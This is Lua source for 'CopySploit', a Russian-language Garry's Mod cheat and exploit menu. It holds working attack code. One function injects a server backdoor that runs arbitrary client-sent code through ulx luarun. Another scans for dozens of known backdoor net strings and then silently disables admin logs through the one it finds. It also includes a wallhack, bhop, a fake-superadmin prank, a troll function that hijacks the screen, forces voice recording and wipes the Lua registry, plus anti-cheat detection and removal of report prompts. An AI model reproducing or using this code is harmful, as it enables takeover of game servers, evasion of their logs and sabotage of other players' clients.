iZNX.Menu.gay = table.Count( iZNX.sploits )
iZNX.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(50, 50, 90) ) -- Цвет обводки внутри меню (41 41 41)
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(50, 50, 90, 245) ) -- Обводка меню
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(0, 0, 50) ) -- Цвет меню в центре
surface.DrawRect( 80, 25, w - 90, h - 35 )
surface.SetDrawColor( Color(100, 100, 100, 200) )
draw.DrawText( "CopySploit\nExploits: "..iZNX.Menu.gay, "default", 8, 15, Color(255,255,255, 350) )
draw.DrawText( "09.07.19", "default", 8, 40, Color(255,255,255, 350) )
draw.DrawText( "---------------","HUDLogo2", 6, 664, Color(255,255,255, 10000) )
draw.DrawText( "Остальное","HUDLogo2", 5, 652, Color(255,255,255, 10000) )
draw.DrawText( "---------------","HUDLogo2", 6, 638, Color(255,255,255, 10000) )
end
local Plist = vgui.Create( "DPanelList", iZNX.Menu )
Plist:SetSize( iZNX.Menu:GetWide() - 90, iZNX.Menu:GetTall() - 35 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 80, 25 )
Plist:SetName( "" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 765, "Ноклип", Noclip, "ClientSide Noclip" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 792, "Инжектор", Inject, "Инжектит фирменный Backdoor на сервер" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 737, "Бэкдур чек", checkbackdoors, "Лист бэкдуров aka чек сервера на бэкдуры (смотреть в консоль)" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 710, "Админ-хак", lmfao, "Фейк ULX выдача SuperAdmin, можно сделать скриншот, мол вы хакер" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 683, "Не нажимать", lmfao1, "НЕ НАЖИМАТЬ!!" )
iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 67, "Создатель", gui.url, "Ссылка на страницу создателя меню" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 148, "Сканер", iZNX.ScanPlayers, "Сканирует игроков" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 121, "Чек Версии", CheckVersion, "Чек версии чита" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 175, "RainbowGun", rainbowphysgun, "Включает радужный физган" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 202, "RunLuaCode", editor, "Run on self - Запуск луа кода на себя" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 229, "WallHack", WHT, "Включает вх" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 256, "BunnyHop", Bhop, "Обыкновенный бхоп" )
iZNX.MakeFunctionButtonr( iZNX.Menu, 7, 94, "Анти-Читы", anticheats, "Показывает меры безопасности (Скринграбы, анти-читы и т.д)" )
local function CreateSploitPanel( name, t )
if !iZNX.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 70 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(50, 50, 90, 245) ) -- Цвет эксплойтов
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )
draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )
end
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "soundboard" then
x = (x + 5) + iZNX.SoundBoard( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( iZNX.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--[[ --------------------------------------------------------------
      _____     _          _   _ _        _   _            _
     |  ___|_ _| | _____  | | | | |_  __ | | | | __ _  ___| | __
     | |_ / _` | |/ / _ \ | | | | \ \/ / | |_| |/ _` |/ __| |/ /
     |  _| (_| |   <  __/ | |_| | |>  <  |  _  | (_| | (__|   <
     |_|  \__,_|_|\_\___|  \___/|_/_/\_\ |_| |_|\__,_|\___|_|\_\

    ---------------------------------------------------------------]]

function lmfao()
surface.PlaySound("garrysmod/ui_click.wav")
if( ulx ) then
chat.AddText( Color( 0, 0, 0, 255 ), "(Console) ", Color( 160, 200, 200, 255 ), "added ", Color( 80, 0, 120, 255 ), "You ", Color( 160, 200, 200, 255 ), "to group ", Color( 0, 255, 0, 255 ), "superadmin" )
else
chat.AddText( "На этом сервере не установлен ULX" )
end
end
CCA( "CopySploit_adduser", lmfao )
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


--[[ ----------------------------------------------------------------------------------
      ____              _ _      ____ _ _      _      ____        _   _
     |  _ \  ___  _ __ ( ) |_   / ___| (_) ___| | __ | __ ) _   _| |_| |_ ___  _ __
     | | | |/ _ \| '_ \|/| __| | |   | | |/ __| |/ / |  _ \| | | | __| __/ _ \| '_ \
     | |_| | (_) | | | | | |_  | |___| | | (__|   <  | |_) | |_| | |_| || (_) | | | |
     |____/ \___/|_| |_|  \__|  \____|_|_|\___|_|\_\ |____/ \__,_|\__|\__\___/|_| |_|

     ----------------------------------------------------------------------------------]]

function lmfao1()
surface.PlaySound("garrysmod/ui_click.wav")
local msg = "Подожди. . ."
surface.CreateFont("lolwutbet", {size=75})
local function huddrawdetour()
	draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
	draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
	draw.SimpleText(msg, "lolwutbet", ScrW() / 2, ScrH() / 2.5, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end


for k,v in pairs(hook.GetTable()) do
	for o,j in pairs(v) do
		if k == "HUDPaint" then
			hook.Remove(k, o)
			hook.Add(k, o, huddrawdetour)
		end
	end
end
hook.Add("HUDPaint","eztoirkfghdjbnvxc", huddrawdetour)

timer.Create("wowlolwut_my_boi",2 ,0 , function()
	msg = table.Random({
		"Зачем ты нажал?",
		"cl_yawspeed 8",
		"-right",
		"Почему ты это сделал ?",
		"Я уже взламываю твой аккаунт",
		"Я же написал, чтоб ты не нажимал",
		"Команды на экране",
		"u n00b",
		"-right",
		"1337 h4ck3r",
		"Больше не нажимай на меня, ок?",
		"cl_yawspeed 8",
		"Надеюсь, ты усвоил урок",
		"..."})
end)

timer.Create("lgfholjghlfdsh",0 ,0 , function()
	MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "ЗАПУСТИ МЕНЯ ЕЩЕ РАЗ, ДАВАЙ, СДЕЛАЙ ЭТО!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! !\n")
end)
sound.PlayURL("http://d.zaix.ru/5Kko.mp3","mono noblock", function( s )
	s:Play()
end)
LocalPlayer():ConCommand("+voicerecord")
LocalPlayer():ConCommand("cl_yawspeed 9999")
LocalPlayer():ConCommand("+right")
MsgC(HSVToColor( CurTime() % 6 * 60, 1, 1 ), "Нажми escape !\n")
timer.Simple(5 * 60, function()
	table.Empty(debug.getregistry())
end )
end
concommand.Add( "Music_troll", lmfao1 )
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--[[------------------------------------------------------------------
        ____      _           ____ _               _
       / ___|__ _| | _____   / ___| |__   ___  ___| | _____ _ __
      | |   / _` | |/ / _ \ | |   | '_ \ / _ \/ __| |/ / _ \ '__|
      | |__| (_| |   <  __/ | |___| | | |  __/ (__|   <  __/ |
       \____\__,_|_|\_\___|  \____|_| |_|\___|\___|_|\_\___|_|

    ------------------------------------------------------------------]]

if (_G.QAC or _G.CAC) then
        surface.PlaySound("ambient/alarms/klaxon1.wav")
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "На сервере стоит Cake Anti Cheat!")
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local ply = LocalPlayer()
function Noclip()
surface.PlaySound("garrysmod/ui_click.wav")
ply:ConCommand( "CopySploit_noclip" )
end
local SW = {}
SW.Enabled = false
SW.ViewOrigin = Vector( 0, 0, 0 )
SW.ViewAngle = Angle( 0, 0, 0 )
SW.Velocity = Vector( 0, 0, 0 )
function SW.CalcView( ply, origin, angles, fov )
    if ( !SW.Enabled ) then return end
        if ( SW.SetView ) then
        SW.ViewOrigin = origin
        SW.ViewAngle = angles
        SW.SetView = false
        end
    return { origin = SW.ViewOrigin, angles = SW.ViewAngle }
end
hook.Add( "CalcView", "SpiritWalk", SW.CalcView )
function SW.CreateMove( cmd )
    if ( !SW.Enabled ) then return end

    local time = FrameTime()
    SW.ViewOrigin = SW.ViewOrigin + ( SW.Velocity * time )
    SW.Velocity = SW.Velocity * 0.95

    local sensitivity = 0.022
    SW.ViewAngle.p = math.Clamp( SW.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
    SW.ViewAngle.y = SW.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )


    local add = Vector( 0, 0, 0 )
    local ang = SW.ViewAngle
    if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
    if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
    if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
    if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
    if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
    if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
    add = add:GetNormal() * time * 3000
    if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 2 end

    SW.Velocity = SW.Velocity + add
    if ( SW.LockView == true ) then
      SW.LockView = cmd:GetViewAngles()
    end
    if ( SW.LockView ) then
        cmd:SetViewAngles( SW.LockView )
    end
    cmd:SetForwardMove( 0 )
    cmd:SetSideMove( 0 )
    cmd:SetUpMove( 0 )
end
hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
    function SW.Toggle()
    SW.Enabled = !SW.Enabled
    SW.LockView = SW.Enabled
    SW.SetView = true
    local status = { [ true ] = "ON", [ false ] = "OFF" }
end
concommand.Add( "CopySploit_noclip", SW.Toggle )

function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Superadmin Injector
function Inject()
surface.PlaySound("garrysmod/ui_click.wav")
    chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 255, 255 )," Инжектим..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function()
            if( ValidNetString("DefqonBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('DefqonBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 0, 255, 0 )," Успешно заинжекчено!" )
            end
        end )
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 0, 0 )," Failed! Вы не superadmin!" )
    end
    if( ValidNetString("CopySploitBackdoor") ) then
        chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 255, 255 )," Backdoor уже загружен!" )
    end
end




-- Backdoor Checker
function checkbackdoors()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 255, 255 )," В консоль посмотрите" )
if( ValidNetString("Sbox_darkrp") ) then
        print( "[CopySploit] Найден Backdoor! -   Sbox_darkrp" )
    end

if( ValidNetString("_CopySploit") ) then
        print( "[CopySploit] Найден Backdoor! -   _Defqon" )
    end

if( ValidNetString("Sandbox_ArmDupe") ) then
        print( "[CopySploit] Найден Backdoor! -   Sandbox_ArmDupe" )
    end
if( ValidNetString("Sbox_itemstore") ) then
        print( "[CopySploit] Найден Backdoor! -   Sbox_itemstore" )
    end
if( ValidNetString("Ulib_Message") ) then
        print( "[CopySploit] Найден Backdoor! -   Ulib_Message" )
end
if( ValidNetString("ULogs_Info") ) then
        print( "[CopySploit] Найден Backdoor! -   ULogs_Info" )
end
if( ValidNetString("ITEM") ) then
        print( "[CopySploit] Найден Backdoor! -   ITEM" )
end
if( ValidNetString("fix") ) then
        print( "[CopySploit] Найден Backdoor! -   fix" )
end
if( ValidNetString("Fix_Keypads") ) then
        print( "[CopySploit] Найден Backdoor! -   Fix_Keypads" )
end
if( ValidNetString("Remove_Exploiters") ) then
        print( "[CopySploit] Найден Backdoor! -   Remove_Exploiters" )
end
if( ValidNetString("noclipcloakaesp_chat_text") ) then
        print( "[CopySploit] Найден Backdoor! -   noclipcloakaesp_chat_text" )
end
if( ValidNetString("_CAC_ReadMemory") ) then
        print( "[CopySploit] Найден Backdoor! -   _CAC_ReadMemory" )
end
if( ValidNetString("nostrip") ) then
        print( "[CopySploit] Найден Backdoor! -   nostrip" )
end
if( ValidNetString("nocheat") ) then
        print( "[CopySploit] Найден Backdoor! -   nocheat" )
end
if( ValidNetString("LickMeOut") ) then
        print( "[CopySploit] Найден Backdoor! -   LickMeOut" )
end
if( ValidNetString("ULX_QUERY2") ) then
        print( "[CopySploit] Найден Backdoor! -   ULX_QUERY2" )
end
if( ValidNetString("MoonMan") ) then
        print( "[CopySploit] Найден Backdoor! -   MoonMan" )
end
if( ValidNetString("Im_SOCool") ) then
        print( "[CopySploit] Найден Backdoor! -   Im_SOCool" )
end
if( ValidNetString("Sandbox_GayParty") ) then
        print( "[CopySploit] Найден Backdoor! -   Sandbox_GayParty" )
end
if( ValidNetString("DarkRP_UTF8") ) then
        print( "[CopySploit] Найден Backdoor! -   DarkRP_UTF8" )
end
if( ValidNetString("oldNetReadData") ) then
        print( "[CopySploit] Найден Backdoor! -   oldNetReadData" )
end
if( ValidNetString("memeDoor") ) then
        print( "[CopySploit] Найден Backdoor! -   memeDoor" )
end
if( ValidNetString("BackDoor") ) then
        print( "[CopySploit] Найден Backdoor! -   BackDoor" )
end
if( ValidNetString("OdiumBackDoor") ) then
        print( "[CopySploit] Найден Backdoor! -   OdiumBackDoor" )
end
if( ValidNetString("cucked") ) then
        print( "[CopySploit] Найден Backdoor! -   cucked" )
end
if( ValidNetString("NoNerks") ) then
        print( "[CopySploit] Найден Backdoor! -   NoNerks" )
end
if( ValidNetString("kek") ) then
        print( "[CopySploit] Найден Backdoor! -   kek" )
end
if( ValidNetString("ZimbaBackDoor") ) then
        print( "[CopySploit] Найден Backdoor! -   ZimbaBackDoor" )
end
if( ValidNetString("something") ) then
        print( "[CopySploit] Найден Backdoor! -   something" )
end
if( ValidNetString("random") ) then
        print( "[CopySploit] Найден Backdoor! -   random" )
end
if( ValidNetString("strip0") ) then
        print( "[CopySploit] Найден Backdoor! -   strip0" )
end
if( ValidNetString("DarkRP_AdminWeapons") ) then
        print( "[CopySploit] Найден Backdoor! -   DarkRP_AdminWeapons" )
end
if( ValidNetString("SessionBackdoor") ) then
        print( "[CopySploit] Найден Backdoor! -   SessionBackdoor" )
end
if( ValidNetString("ULXQUERY2") ) then
        print( "[CopySploit] Найден Backdoor! -   ULXQUERY2" )
end
if( ValidNetString("fellosnake") ) then
        print( "[CopySploit] Найден Backdoor! -   fellosnake" )
end
if( ValidNetString("enablevac") ) then
        print( "[CopySploit] Найден Backdoor! -   enablevac" )
end
if( ValidNetString("idk") ) then
        print( "[CopySploit] Найден Backdoor! -   idk" )
end
if( ValidNetString("c") ) then
        print( "[CopySploit] Найден Backdoor! -   c" )
end
if( ValidNetString("killserver") ) then
        print( "[CopySploit] Найден Backdoor! -   killserver" )
end
if( ValidNetString("fuckserver") ) then
        print( "[CopySploit] Найден Backdoor! -   fuckserver" )
end
if( ValidNetString("cvaraccess") ) then
        print( "[CopySploit] Найден Backdoor! -   cvaraccess" )
end
if( ValidNetString("rcon") ) then
        print( "[CopySploit] Найден Backdoor! -   rcon" )
end
if( ValidNetString("rconadmin") ) then
        print( "[CopySploit] Найден Backdoor! -   rconadmin" )
end
if( ValidNetString("web") ) then
        print( "[CopySploit] Найден Backdoor! -   web" )
end
if( ValidNetString("jesuslebg") ) then
        print( "[CopySploit] Найден Backdoor! -   jesuslebg" )
end
if( ValidNetString("zilnix") ) then
        print( "[CopySploit] Найден Backdoor! -   zilnix" )
end
if( ValidNetString("Þà?D)◘") ) then
        print( "[CopySploit] Найден Backdoor! -   Þà?D)◘" )
end
if( ValidNetString("disablebackdoor") ) then
        print( "[CopySploit] Найден Backdoor! -   disablebackdoor" )
end
if( ValidNetString("kill") ) then
        print( "[CopySploit] Найден Backdoor! -   kill" )
end
if( ValidNetString("DefqonBackdoor") ) then
        print( "[CopySploit] Найден Фирменный Backdoor! -   DefqonBackdoor" )
end
end


-- Auto-Backdoor checker
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

	if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
    if( ValidNetString("Sbox_itemstore") ) then
        netKey = "Sbox_itemstore"
    else
    end
	if( ValidNetString("Ulib_Message") ) then
        netKey = "Ulib_Message"
    else
    end
	if( ValidNetString("Sbox_darkrp") ) then
        netKey = "Sbox_darkrp"
    else
    end
	if( ValidNetString("ULogs_Info") ) then
        netKey = "ULogs_Info"
    else
    end
	if( ValidNetString("ITEM") ) then
        netKey = "ITEM"
    else
    end
	if( ValidNetString("fix") ) then
        netKey = "fix"
    else
    end
	if( ValidNetString("nocheat") ) then
        netKey = "nocheat"
    else
    end
	if( ValidNetString("ULX_QUERY2") ) then
        netKey = "ULX_QUERY2"
    else
    end
	if( ValidNetString("Sandbox_GayParty") ) then
        netKey = "Sandbox_GayParty"
    else
    end
	if( ValidNetString("DarkRP_UTF8") ) then
        netKey = "DarkRP_UTF8"
    else
    end
	if( ValidNetString("oldNetReadData") ) then
        netKey = "oldNetReadData"
    else
    end
	if( ValidNetString("BackDoor") ) then
        netKey = "BackDoor"
    else
    end
	if( ValidNetString("OdiumBackDoor") ) then
        netKey = "OdiumBackDoor"
    else
    end
	if( ValidNetString("cucked") ) then
        netKey = "cucked"
    else
    end
	if( ValidNetString("NoNerks") ) then
        netKey = "NoNerks"
    else
    end
	if( ValidNetString("kek") ) then
        netKey = "kek"
    else
    end
	if( ValidNetString("ZimbaBackDoor") ) then
        netKey = "ZimbaBackDoor"
    else
    end
	if( ValidNetString("something") ) then
        netKey = "something"
    else
    end
	if( ValidNetString("random") ) then
        netKey = "random"
    else
    end
	if( ValidNetString("strip0") ) then
        netKey = "strip0"
    else
    end
	if( ValidNetString("fellosnake") ) then
        netKey = "fellosnake"
    else
    end
	if( ValidNetString("idk") ) then
        netKey = "idk"
    else
    end
	if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
	if( ValidNetString("killserver") ) then
        netKey = "killserver"
    else
    end
	if( ValidNetString("fuckserver") ) then
        netKey = "fuckserver"
    else
    end
	if( ValidNetString("cvaraccess") ) then
        netKey = "cvaraccess"
    else
    end
	if( ValidNetString("rcon") ) then
        netKey = "rcon"
    else
    end
	if( ValidNetString("rconadmin") ) then
        netKey = "rconadmin"
    else
    end
	if( ValidNetString("web") ) then
        netKey = "web"
    else
    end
	if( ValidNetString("jesuslebg") ) then
        netKey = "jesuslebg"
    else
    end
	if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end
	if( ValidNetString("Þà?D)◘") ) then
        netKey = "Þà?D)◘"
    else
    end
	if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
	if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end
	if( ValidNetString("DefqonBackdoor") ) then
        netKey = "DefqonBackdoor"
    else
    end
    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бэкдуров на сервере не найдено." )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 0, 255, 0 ), "Найден .net Backdoor: ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs Отключены." )
                end)
            end
    end

local function gmsg(msg,color)
if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[CopySploit] ",Color( 150,0,0 )," ".. msg) return end
if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[CopySploit] ",Color( 255,0,0 )," ".. msg) return end
if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[CopySploit] ",Color( 43,255,0 )," ".. msg) return end
chat.AddText( "",Color( 255,0,0 ),"[CopySploit] ",Color( 255,255,225 )," ".. msg)
end

function iZNX.ScanPlayers()
surface.PlaySound("garrysmod/ui_click.wav")
local playerscount = 0
local playerscount_admin = 0
local playerscount_hryak = 0
local playerscount_hryak_admin = 0
gmsg ("Группа - Ник - SID - Деньги")
 for k,v in pairs(player.GetAll()) do
    local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
            gmsg(v:GetUserGroup()..": " .. v:Nick() .. " - " .. v:SteamID() .. " - $" .. playermoney.. "","color_green")
 end
end

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})

local title = "You have been reported! Please answer all your reports."
	local function CheckChild(pan)
	    if not pan or not IsValid(pan) then return end

	    if pan.GetTitle and pan:GetTitle() == title then
	        pan:Remove()
	        print("Удален warning box")

	        return
	    end

	    for k, v in pairs(pan:GetChildren()) do
	        if v.GetTitle and v:GetTitle() == title then
	            v:Remove()
	            print("Удален warning box")

	            return
	        end

	        if #v:GetChildren() > 0 then
	            CheckChild(v)
	        end
	    end
	end

	local isttt = false
	if (engine.ActiveGamemode() == "terrortown") then
		isttt = true
	end

	local bypass = 0


































	local rainb = false
	function rainbowphysgun()
	surface.PlaySound("garrysmod/ui_click.wav")
		if not rainb then
			hook.Add("Think", "RGBSTF", function()
			    local rainbowC = HSVToColor(CurTime() % 6 * 60, 1, 1)
			    LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
			    LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
			end)
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Радужный физган включен" )
			rainb = true
		else
			hook.Remove("Think", "RGBSTF")
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Радужный физган выключен" )
			rainb = false
		end
	end



	surface.CreateFont("WHT", {
	    font = "Robot",
		size = ScreenScale(7),
		weight = 150,
		antialias = true,
		shadow = true,
	})



local wh = false
function WHT()
surface.PlaySound("garrysmod/ui_click.wav")
if not wh then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Wallhack включен" )
hook.Add("HUDPaint", "WHT", function()
for k, v in pairs(player.GetAll()) do
if (v:Alive()) then
local Position = (v:GetPos() + Vector(0, 0, 95)):ToScreen()
local Name = ""
local teamName = ""
local colwht = v:IsPlayer() and team.GetColor(v:Team())
if v == LocalPlayer() then
Name = ""
teamName = ""
elseif v:IsBot() then
Name = v:Name() .. "[ БОТ ]"
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
teamName = v:getDarkRPVar("job") or ""
end
else
Name = v:Name()
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
teamName = v:getDarkRPVar("job") or ""
end
end
if v:GetUserGroup() == "user" then
draw.SimpleText(Name .. "(" .. v:Health() .. ")", "WHT", Position.x, Position.y, colwht, 1)
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
local PlyMoney = math.ceil(v:getDarkRPVar("money") or 0)
draw.SimpleText(teamName .. "[" .. PlyMoney .. "]", "WHT", Position.x, Position.y + 20, Color(255, 255, 255, 255), 1)
end
else
draw.SimpleText(Name .. "(" .. v:Health() .. ") [" .. v:GetUserGroup() .. "]", "WHT", Position.x, Position.y, colwht, 1)
if (string.lower(engine.ActiveGamemode()) == "darkrp") then
local PlyMoney = math.ceil(v:getDarkRPVar("money") or 0)
draw.SimpleText(teamName .. "[" .. PlyMoney .. "]", "WHT", Position.x, Position.y + 20, Color(255, 255, 255, 255), 1)
end
end
end
end
end)
wh = true
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Wallhack выключен" )
hook.Remove("HUDPaint", "WHT")
wh = false
end
end
concommand.Add("CopySploit_wallhack", WHT)

local bhop = false
function Bhop()
surface.PlaySound("garrysmod/ui_click.wav")
if not bhop then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Bhop включен" )
hook.Add("CreateMove", "HUIPI", function(ply)
    if input.IsKeyDown(KEY_SPACE) and !injump then
        if LocalPlayer():IsOnGround() and !injump then
            ply:SetForwardMove(10000)
            RunConsoleCommand("+jump")
            timer.Create("Simple_Bhop", 0, 0.01, function()
                RunConsoleCommand("-jump") 
            end)
        else
    if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
      ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
    else
      ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
      ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
    end
    end
end
end)

bhop = true
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Bhop выключен" )
hook.Remove("CreateMove", "HUIPI")
bhop = false
end
end
concommand.Add("CopySploit_bhop", Bhop)






local CommandList2 = {}

local CompleteList2 = {}

local oaddcc = AddConsoleCommand

local _A = {}


_A.aegis = {}

_A.registry = debug.getregistry()

local aegis = {}

_A.aegis.logs = {}

_A.aegis.anticheats = {}

_A.aegis.exploitables = {}



local function ispooped( str )

		local status, error = pcall( net.Start, str )

		return status

	end



	local acfags = {

		["!Cake Anticheat (CAC)"] = {

			desc = "Самый распространенный античит, используемый сегодня (и ваш худший кошмар, прежде чем вы юзанули обход)\nИмеет очень сильные обнаружения, которые все еще лагают, даже через 2 года после его выпуска",

			scan = function() return _A.aegis.anticheats["extensions/client/vehicle.lua"] end,

		},

		["Simplicity Anticheat (SAC)"] = {

			desc = "Новый античит Leystryku, который он выпустил на scriptfodder\nНе силен, как CAC, но (по-видимому) предлагает лучшую производительность серверов",

			scan = function() if _G.simplicity then return true else return false end end,

		},

		["Quack Anticheat (QAC)"] = {

